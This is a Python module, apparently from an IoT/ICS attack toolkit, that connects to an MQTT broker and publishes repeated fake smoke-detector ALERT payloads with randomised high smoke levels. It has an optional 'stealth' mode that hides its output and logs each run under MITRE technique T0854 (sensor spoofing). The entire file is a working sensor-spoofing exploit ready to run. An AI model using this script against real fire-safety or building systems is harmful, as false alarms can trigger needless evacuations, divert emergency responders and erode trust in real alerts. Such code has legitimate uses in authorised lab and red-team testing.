# modules/exploits/smoke_detector_faker.py

import argparse
import json
import os
from datetime import datetime
import time
import random
import paho.mqtt.client as mqtt

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0854"  # Environmental Sensor Spoofing

def log_smoke_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_fake_alerts(broker, topic, repeat, stealth):
    client = mqtt.Client()
    try:
        client.connect(broker)
    except Exception as e:
        print(f"[!] MQTT connect failed: {e}")
        return

    for i in range(repeat):
        level = random.uniform(2.0, 4.5)  # Simulated smoke density (high false positive)
        payload = json.dumps({"smoke_level": level, "status": "ALERT"})
        client.publish(topic, payload)
        if not stealth:
            print(f"[âœ“] Spoofed smoke level sent: {level:.2f}")
        time.sleep(1)

    log_smoke_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "broker": broker,
        "topic": topic,
        "repeat": repeat,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fake Smoke Detector Alerts")
    parser.add_argument("--broker", required=True)
    parser.add_argument("--topic", required=True)
    parser.add_argument("--repeat", type=int, default=5)
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    send_fake_alerts(args.broker, args.topic, args.repeat, args.stealth)
